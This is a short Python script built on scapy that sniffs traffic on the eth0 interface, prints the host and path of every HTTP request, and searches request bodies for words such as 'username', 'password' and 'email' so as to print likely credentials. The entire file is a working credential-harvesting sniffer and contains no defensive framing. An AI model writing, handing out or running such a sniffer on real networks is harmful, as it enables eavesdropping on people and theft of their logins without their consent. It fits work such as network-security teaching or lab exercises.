#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
        print("[+] Http Request >> " + url)
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key in load:
                    print("\n\n\n[+] Possible password/username >> " + load + "\n\n\n")
                    break


sniff("eth0")
